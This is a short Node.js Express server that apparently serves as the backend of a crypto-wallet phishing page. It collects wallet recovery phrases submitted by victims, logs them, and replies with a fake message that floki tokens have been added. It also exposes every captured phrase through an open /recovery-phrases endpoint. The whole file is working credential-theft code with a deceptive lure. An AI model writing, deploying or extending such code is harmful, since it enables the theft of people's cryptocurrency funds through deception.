const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

let recoveryPhrases = []; // This array will store recovery phrases with wallet type

app.use(bodyParser.json());

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Serve the index.html file at the root
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Endpoint to submit recovery phrase
app.post('/submit-recovery-phrase', (req, res) => {
    const { phrase, walletType } = req.body;

    // Store the recovery phrase along with wallet type
    recoveryPhrases.push({ phrase, walletType });
    console.log('Recovery Phrase:', phrase, 'Wallet Type:', walletType);

    // Respond with a success message
    res.json({ success: true, message: "*** floki tokens have been added to your wallet" });
});

// Endpoint to retrieve all recovery phrases
app.get('/recovery-phrases', (req, res) => {
    res.json(recoveryPhrases);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
